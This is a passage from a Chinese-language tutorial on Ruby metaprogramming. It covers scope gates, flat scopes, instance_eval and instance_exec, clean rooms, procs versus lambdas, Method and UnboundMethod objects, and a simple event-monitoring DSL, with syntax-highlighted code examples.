<p>如何使用闭包呢？</p>
</blockquote>
<p>​    这里我们需要了解绑定寄居的地方——作用域，需要判断程序在哪里切换了作用域，作用域的作用有哪些？</p>
<h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>​    不论是Java，Python，Ruby都会有作用域的概念，就好像是单独的一个作用空间，一个领地，在这里有专属的局部变量</p>
<h3 id="切换作用域"><a href="#切换作用域" class="headerlink" title="切换作用域"></a>切换作用域</h3><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">v1 <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 顶层作用域</span>
<span class="token keyword">class</span> <span class="token class-name">MyClass</span>  <span class="token comment"># 类作用域</span>
	v2 <span class="token operator">=</span> <span class="token number">2</span>
	p local_variables  <span class="token comment"># => [:v2]</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span>  <span class="token comment"># 方法作用域</span>
		v3 <span class="token operator">=</span> <span class="token number">3</span>
		p local_variables  <span class="token comment"># => [:v3]</span>
	<span class="token keyword">end</span>
	p local_variables  <span class="token comment"># => [:v2]</span>
<span class="token keyword">end</span>
obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span> 
obj<span class="token punctuation">.</span>my_method
obj<span class="token punctuation">.</span>my_method
p local_variables  <span class="token comment"># => [:v1, :obj]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最初在顶层作用域 定义 v1 = 1</p>
<p>定义class MyClass，切换作用域，一旦切换作用域，绑定也会修改，v1对于MyClass内部域是不可见的，在其内部定义了一个方法和变量，当执行到实例方法内部，作用域再次切换</p>
<p>当MyClass定义完毕，再次切换回顶级作用域。</p>
<blockquote>
<p>全局变量与顶级实例变量</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token variable">$var</span> <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">incre</span></span>
		<span class="token variable">$var</span> <span class="token operator">+=</span> <span class="token number">1</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
p <span class="token variable">$var</span>
obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span> 
obj<span class="token punctuation">.</span>incre
p <span class="token variable">$var</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里定义了全局变量var，发现在所有作用域都可以访问并操作到，所以一旦出现问题，很难排查。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token variable">@var</span> <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span>
	<span class="token variable">@var</span> <span class="token operator">+=</span> <span class="token number">1</span>
<span class="token keyword">end</span>
p <span class="token variable">@var</span>
my_method
p <span class="token variable">@var</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里定义一个顶级上下文中的实例变量，当main对象扮演self的角色，就可以访问到顶级实例变量，但如果进入其他对象作为self，则无法访问到</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token variable">@var</span> <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">class</span> <span class="token class-name">MyClass</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span>
    <span class="token variable">@var</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"this is not top level @var"</span></span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span> 
obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
p obj<span class="token punctuation">.</span>my_method<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>顶级实例变量 要比 全局变量 有限的安全</p>
<p>这里我们想弄清楚作用域是如何切换，绑定是如何切换的，需要了解作用域门</p>
<h3 id="作用域门"><a href="#作用域门" class="headerlink" title="作用域门"></a>作用域门</h3><p>程序一般会在三个地方，关闭之前的作用域，打开新的作用域，分别为：</p>
<ol>
<li>方法 def</li>
<li>类定义 class</li>
<li>模块儿定义 module</li>
</ol>
<p>每个关键字对应一个作用域门，各个作用域中的变量相互隔离</p>
<blockquote>
<p>现在看到每个作用域有独立的空间，如果想要变量在作用域之间传递，该如何操作？</p>
</blockquote>
<h3 id="扁平化作用域"><a href="#扁平化作用域" class="headerlink" title="扁平化作用域"></a>扁平化作用域</h3><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">var <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Success"</span></span>
<span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token comment"># 这里想访问到var</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span>
		<span class="token comment"># 这里想访问到var</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p> 一旦切换作用域局部变量就会失效，如何能让var穿越两个作用域被访问到？</p>
</blockquote>
<p>Ruby是非常灵活的，它为一种实现提供了多种方法，上面知道了<code>class module def</code>三个关键字为作用域门，那我们使用其他方式来实现相同的结果，这样就可以避免切换作用域了</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">var <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Success"</span></span>
<span class="token comment"># 使用Class.new 切换 class关键字，避免切换作用域</span>
MyClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token keyword">do</span> 
	p var
  <span class="token comment"># 使用动态定义方法，替换def关键字，避免切换作用域</span>
	<span class="token keyword">define_method</span> <span class="token symbol">:my_method</span> <span class="token keyword">do</span>
		p var
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
obg <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span> 
obg<span class="token punctuation">.</span>my_method<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    如果两个作用域挤压在一起，我们通常简称为 扁平作用域</p>
<h3 id="共享作用域"><a href="#共享作用域" class="headerlink" title="共享作用域"></a>共享作用域</h3><blockquote>
<p>​    如果想在一组方法之间共享一个变量，但又不想别的方法访问到这个变量，就可以把这些方法定义在该变量所在的扁平作用域</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span>
  <span class="token comment"># 这里是一个局部变量，希望仅被几个方法访问到</span>
	share <span class="token operator">=</span> <span class="token number">0</span>
  <span class="token comment"># 使用内核方法，调用 define_method 来定义函数，而又不用切换域，这样这几个方法就可以访问到变量</span>
  <span class="token comment"># 也可以只用 define_method :counter do</span>
	Kernel<span class="token punctuation">.</span>send <span class="token symbol">:define_method</span><span class="token punctuation">,</span><span class="token symbol">:counter</span> <span class="token keyword">do</span>
		share
	<span class="token keyword">end</span>
	Kernel<span class="token punctuation">.</span>send <span class="token symbol">:define_method</span><span class="token punctuation">,</span><span class="token symbol">:inc</span> <span class="token keyword">do</span> <span class="token operator">|</span>x<span class="token operator">|</span>
		share <span class="token operator">+=</span> x
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">other_method</span></span>
  <span class="token comment"># 这里则无法再访问到share</span>
  share
<span class="token keyword">end</span>
my_method
p counter   <span class="token comment"># => 0</span>
inc <span class="token number">4</span>
p counter   <span class="token comment"># => 4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="上下文探针（instance-eval）"><a href="#上下文探针（instance-eval）" class="headerlink" title="上下文探针（instance_eval）"></a>上下文探针（instance_eval）</h3><p>这里我们学习一个新的方法：<code>BasicObject#instance_eval</code>,它在一个对象的上下文中执行block，运行时，代码块的接收者将会成为self</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span>
		<span class="token variable">@v</span> <span class="token operator">=</span> <span class="token number">1</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
<span class="token comment"># 这里self切换为obj</span>
obj<span class="token punctuation">.</span>instance_eval <span class="token keyword">do</span>
	p <span class="token keyword">self</span>
  <span class="token comment"># 输出的实例变量也是属于self的</span>
	p <span class="token variable">@v</span>
<span class="token keyword">end</span>
<span class="token comment"># 上下文探针结束后，self又变回了 main </span>
<span class="token comment"># 这里 下面三行代码都处在扁平作用域，所以Block可以使用局部变量v，并访问到obj中的实例变量</span>
v <span class="token operator">=</span> <span class="token number">2</span>
obj<span class="token punctuation">.</span>instance_eval <span class="token punctuation">&#123;</span><span class="token variable">@v</span> <span class="token operator">=</span> v<span class="token punctuation">&#125;</span>
obj<span class="token punctuation">.</span>instance_eval <span class="token punctuation">&#123;</span>p <span class="token variable">@v</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>这里需要注意一个点：instance_eval会将接收者变为当前对象self。而调用者的<strong>实例变量</strong>就落在作用域范围外，如果不了解，就会出现Bug，例如：</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">C</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span>
		<span class="token variable">@x</span> <span class="token operator">=</span> <span class="token number">1</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token keyword">class</span> <span class="token class-name">D</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">twisted_method</span></span>
    <span class="token comment"># 如果这里 @y 改为 y ，即可被访问到</span>
		<span class="token variable">@y</span> <span class="token operator">=</span> <span class="token number">2</span>
    <span class="token comment"># 在执行下面代码之前，self为D.new，一旦执行下面的代码，C.new为self，@x在C.new中定义了，@y则没有</span>
		<span class="token class-name">C</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">.</span>instance_eval <span class="token punctuation">&#123;</span><span class="token string-literal"><span class="token string">"@x : </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content"><span class="token variable">@x</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> , @y : </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content"><span class="token variable">@y</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
p <span class="token class-name">D</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">.</span>twisted_method  <span class="token comment"># => "@x : 1 , @y : "</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    这里输出发现，@y并未访问到， 可是上面的调用代码在同一个扁平作用域，原来是因为instance_eval将C.new对象变为当前对象self，调用者的实例变量就落在了作用域外了，所以访问不到为：nil。</p>
<blockquote>
<p>这里使用 instance_exec 来解决传递参数的问题</p>
</blockquote>
<h4 id="instance-exec"><a href="#instance-exec" class="headerlink" title="instance_exec"></a>instance_exec</h4><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">D</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">twisted_method</span></span>
		<span class="token variable">@y</span> <span class="token operator">=</span> <span class="token number">2</span>
    <span class="token comment"># 这里主动将 @y传递到块儿中</span>
		<span class="token class-name">C</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">.</span>instance_exec<span class="token punctuation">(</span><span class="token variable">@y</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">|</span>y<span class="token operator">|</span><span class="token string-literal"><span class="token string">"@x : </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content"><span class="token variable">@x</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> , @y : </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">y</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="洁净室"><a href="#洁净室" class="headerlink" title="洁净室"></a>洁净室</h3><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">CleanRoom</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">current_temp</span></span>
    <span class="token number">18</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>
clean_room <span class="token operator">=</span> <span class="token class-name">CleanRoom</span><span class="token punctuation">.</span><span class="token keyword">new</span>
clean_room<span class="token punctuation">.</span>instance_eval <span class="token keyword">do</span>
  <span class="token keyword">if</span> current_temp <span class="token operator">&lt;</span> <span class="token number">20</span>
    p <span class="token string-literal"><span class="token string">"wear a jacket"</span></span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    洁净室只是一个用来执行块的环境，它提供若干有用的方法供代码块调用，比如本例中的<code>current_temperature</code>方法，然而一个理想的洁净室应该是没有实例变量和方法的，因为这可能与block从环境中带来的名字冲突，因此BasicObject的实例往往用来充当洁净室，因为它是白板类，几乎没什么方法。</p>
<h3 id="可调用对象"><a href="#可调用对象" class="headerlink" title="可调用对象"></a>可调用对象</h3><p>​    目前我们使用的Block是直接执行的，我们需要让Block变为对象，可以进行打包传递，调用，我们看一下有哪些打包代码的方式。</p>
<ol>
<li>proc , 将Block转为Proc对象</li>
<li>lambda ，属于proc的变种</li>
<li>使用方法</li>
</ol>
<h4 id="Proc对象"><a href="#Proc对象" class="headerlink" title="Proc对象"></a>Proc对象</h4><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># 将Block打包为Proc</span>
inc <span class="token operator">=</span> <span class="token class-name">Proc</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token punctuation">&#123;</span><span class="token operator">|</span>x<span class="token operator">|</span> x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">&#125;</span>
<span class="token comment"># 主动调用Block</span>
p inc<span class="token punctuation">.</span>call <span class="token number">2</span>

inc_ <span class="token operator">=</span> proc <span class="token punctuation">&#123;</span><span class="token operator">|</span>x<span class="token operator">|</span> x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">&#125;</span>
p inc<span class="token punctuation">.</span>call <span class="token number">2</span>

obj <span class="token operator">=</span> lambda <span class="token punctuation">&#123;</span><span class="token operator">|</span>x<span class="token operator">|</span> x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">&#125;</span>
p obj<span class="token punctuation">.</span>call <span class="token number">2</span>

obj_ <span class="token operator">=</span> <span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">&#125;</span>
p obj_<span class="token punctuation">.</span>call <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="amp-操作符"><a href="#amp-操作符" class="headerlink" title="&amp;操作符"></a>&amp;操作符</h4><p>​    在调用方法时，我们为其传递一个Block，可通过yield进行执行，但是如果我们想将这个Block封装起来，延迟调用，该如何操作</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># 这里&amp;block将Block封装为Proc</span>
<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token operator">&amp;</span>block<span class="token punctuation">)</span>
	p name
  <span class="token comment"># 这里对其调用</span>
	block<span class="token punctuation">.</span>call
<span class="token keyword">end</span>
<span class="token comment"># 传递Block时，不需要再参数后面加 , </span>
my_method <span class="token string-literal"><span class="token string">"qsc"</span></span> <span class="token keyword">do</span> p <span class="token string-literal"><span class="token string">"Hello World"</span></span> <span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>如果想把 Proc 再转为 Block 该怎么操作</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span><span class="token punctuation">(</span>greeting<span class="token punctuation">)</span>
	p <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">greeting</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> , </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content"><span class="token keyword">yield</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">&#125;"</span></span>
<span class="token keyword">end</span>
my_proc <span class="token operator">=</span> proc <span class="token punctuation">&#123;</span><span class="token string-literal"><span class="token string">"Bill"</span></span><span class="token punctuation">&#125;</span>
my_method<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"Hello"</span></span><span class="token punctuation">,</span><span class="token operator">&amp;</span>my_proc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    现在就可以将Block与Proc相互转化了</p>
<h4 id="Lambda-和-Proc的区别"><a href="#Lambda-和-Proc的区别" class="headerlink" title="Lambda 和 Proc的区别"></a>Lambda 和 Proc的区别</h4><ol>
<li>参数校验不同</li>
<li>return定义不同</li>
</ol>
<p>​    参数校验是指：Lambda中定义两个入参，如果你没传递，或者传递多了，则会报错，如果是Proc定义两个入参，如果没传递，则变量为nil，如果传递多了，多余部分也不会使用。Lambda更严格一些</p>
<p>​    return定义不同：Lambda中使用return，表示从Lambda表达式中返回，而Proc表示从定义Proc的作用域中返回</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span>
  <span class="token comment"># 这里block在my_method中定义，一旦执行return就会从my_method中退出</span>
	p <span class="token operator">=</span> <span class="token class-name">Proc</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token number">10</span><span class="token punctuation">&#125;</span>
	result <span class="token operator">=</span> p<span class="token punctuation">.</span>call  <span class="token comment"># 这里调用完，就退出定义p的作用域，所以下面执行不到</span>
	<span class="token keyword">return</span> result <span class="token operator">*</span> <span class="token number">2</span>  <span class="token comment"># 这里实际上是不可到达的</span>
<span class="token keyword">end</span>

p my_method <span class="token comment"># => 10 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span>
	p <span class="token operator">=</span> lambda <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token number">10</span><span class="token punctuation">&#125;</span>
	result <span class="token operator">=</span> p<span class="token punctuation">.</span>call
	<span class="token keyword">return</span> result <span class="token operator">*</span> <span class="token number">2</span>  
<span class="token keyword">end</span>

p my_method <span class="token comment"># => 20 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Lambda和Proc对比"><a href="#Lambda和Proc对比" class="headerlink" title="Lambda和Proc对比"></a>Lambda和Proc对比</h4><p>​    整体而言，Lambda更直观，它更像一个方法，对参数数量校验严格，在调用return时，只是从代码中返回。</p>
<h4 id="Method对象"><a href="#Method对象" class="headerlink" title="Method对象"></a>Method对象</h4><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span>
		<span class="token variable">@v</span> <span class="token operator">=</span> <span class="token number">100</span>
	<span class="token keyword">end</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span>
		<span class="token variable">@v</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
<span class="token comment"># 通过Kernel#method方法，将obj中的方法转为一个Method对象 ！！！ </span>
mobj <span class="token operator">=</span> obj<span class="token punctuation">.</span>method <span class="token symbol">:my_method</span>

p mobj<span class="token punctuation">.</span><span class="token keyword">class</span>  <span class="token comment"># => Method</span>
<span class="token comment"># 主动调用</span>
p mobj<span class="token punctuation">.</span>call
mobj<span class="token punctuation">.</span>to_proc  <span class="token comment"># 将Method转为Proc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>Method和Proc有什么区别？</p>
</blockquote>
<p>lambda 在定义它的作用域执行，block是一个闭包</p>
<p>Method 对象会在自身所在的对象的作用域执行，因为Method是所属对象的</p>
<h4 id="自由方法"><a href="#自由方法" class="headerlink" title="自由方法"></a>自由方法</h4><p>​    听名字感觉是一个脱离类，模块儿的一个方法，可以使用<code>Module#unbind</code>将一个方法转为自由方法，也可以使用<code>Module#instance_method</code>获取一个自由方法</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">MyModule</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span>
		<span class="token number">42</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
unbound <span class="token operator">=</span> MyModule<span class="token punctuation">.</span>instance_method<span class="token punctuation">(</span><span class="token symbol">:my_method</span><span class="token punctuation">)</span>
p unbound<span class="token punctuation">.</span><span class="token keyword">class</span>  <span class="token comment"># => UnboundMethod</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    自由方法并不能脱离对象执行，所以我们可以把他再绑定到一个对象中，使之再次成为Method对象，可以使用<code>UnboundMethod#bind</code>进行绑定，从某个类中分离出来的UnboundMethod，只能绑定在该类或者子类的对象上，模块儿中分离的自由方法则可以自由处置。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">MyModule</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span>
		<span class="token number">42</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
unbound <span class="token operator">=</span> MyModule<span class="token punctuation">.</span>instance_method<span class="token punctuation">(</span><span class="token symbol">:my_method</span><span class="token punctuation">)</span>
p unbound<span class="token punctuation">.</span><span class="token keyword">class</span>  <span class="token comment"># => UnboundMethod</span>
<span class="token comment"># 这里在String中定义新的方法，以前我们会传递一个Block，这里我们直接像参数一眼进行传递</span>
<span class="token builtin">String</span><span class="token punctuation">.</span>send <span class="token symbol">:define_method</span><span class="token punctuation">,</span><span class="token symbol">:another_method</span><span class="token punctuation">,</span>unbound
p <span class="token string-literal"><span class="token string">"abc"</span></span><span class="token punctuation">.</span>another_method<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="编写领域专属语言（DSL）"><a href="#编写领域专属语言（DSL）" class="headerlink" title="编写领域专属语言（DSL）"></a>编写领域专属语言（DSL）</h3><blockquote>
<p>编写一个监视工具，如果发生不正常状况，进行消息通知，比如：</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># 定义一个事件，传达一个事件描述，如果传递的代码块为true，则进行事件描述通知，如果为false，则不通知</span>
event <span class="token string-literal"><span class="token string">"we're earning wade of money"</span></span> <span class="token keyword">do</span>
    <span class="token comment"># 这里从数据库中获取数据</span>
    recent_orders <span class="token operator">=</span> <span class="token number">10000</span>
    recent_orders <span class="token operator">></span> <span class="token number">5000</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="第一个领域专用语言"><a href="#第一个领域专用语言" class="headerlink" title="第一个领域专用语言"></a>第一个领域专用语言</h4><blockquote>
<p>我们进行第一版的设计，只要让这个程序每隔几分钟运行一次</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># 这里需要将加载路径添加，否则load会报错</span>
<span class="token variable">$LOAD_PATH</span><span class="token punctuation">.</span>unshift<span class="token punctuation">(</span><span class="token builtin">File</span><span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">)</span> 

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">event</span></span><span class="token punctuation">(</span>description<span class="token punctuation">)</span>
    p description <span class="token keyword">if</span> <span class="token keyword">yield</span>
<span class="token keyword">end</span>
<span class="token comment"># 加载后，所有事件将会执行</span>
load <span class="token string-literal"><span class="token string">'events.rb'</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># 这个文件就定义所有的事件</span>
event <span class="token string-literal"><span class="token string">"i am test can i get the right result: false"</span></span> <span class="token keyword">do</span>
    <span class="token boolean">false</span>
<span class="token keyword">end</span>
event <span class="token string-literal"><span class="token string">"i am test can i get the right result: true"</span></span> <span class="token keyword">do</span>
    <span class="token boolean">true</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="共享事件"><a href="#共享事件" class="headerlink" title="共享事件"></a>共享事件</h4><blockquote>
<p>共享事件：是否能让两个独立的事件访问同一个变量？ （使用<strong>扁平作用域</strong>）</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">monthly_sales</span></span>
    <span class="token number">100</span>  <span class="token comment"># 从数据库获取的</span>
<span class="token keyword">end</span>

target_sales <span class="token operator">=</span> <span class="token number">101</span> 

event <span class="token string-literal"><span class="token string">"monthly sales are suspiciously"</span></span> <span class="token keyword">do</span>
    monthly_sales <span class="token operator">></span> target_sales
<span class="token keyword">end</span>

event <span class="token string-literal"><span class="token string">"monthly sales are abysmally low"</span></span> <span class="token keyword">do</span>
    monthly_sales <span class="token operator">&lt;</span> target_sales
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="改良的DSL"><a href="#改良的DSL" class="headerlink" title="改良的DSL"></a>改良的DSL</h4><blockquote>
<p>这里我们将方法和临时变量直接定义在顶级作用域中，这是不合适的，应该进行封装与优化，希望是下面的效果</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">setup <span class="token keyword">do</span>
    puts <span class="token string-literal"><span class="token string">"Setting up sky"</span></span>
    <span class="token variable">@sky_height</span> <span class="token operator">=</span> <span class="token number">100</span>
<span class="token keyword">end</span>

setup <span class="token keyword">do</span>
    puts <span class="token string-literal"><span class="token string">"Setting up mountains"</span></span>
    <span class="token variable">@mountains_height</span> <span class="token operator">=</span> <span class="token number">200</span>
<span class="token keyword">end</span>

event <span class="token string-literal"><span class="token string">"the sky is falling"</span></span> <span class="token keyword">do</span>
    <span class="token variable">@sky_height</span> <span class="token operator">&lt;</span> <span class="token number">200</span>
<span class="token keyword">end</span>

event <span class="token string-literal"><span class="token string">"its getting closer"</span></span> <span class="token keyword">do</span>
    <span class="token variable">@sky_height</span> <span class="token operator">&lt;</span> <span class="token variable">@mountains_height</span>
<span class="token keyword">end</span>

event <span class="token string-literal"><span class="token string">"whoops ... too late"</span></span> <span class="token keyword">do</span>
    <span class="token variable">@sky_height</span> <span class="token operator">&lt;</span> <span class="token number">0</span>
<span class="token keyword">end</span>

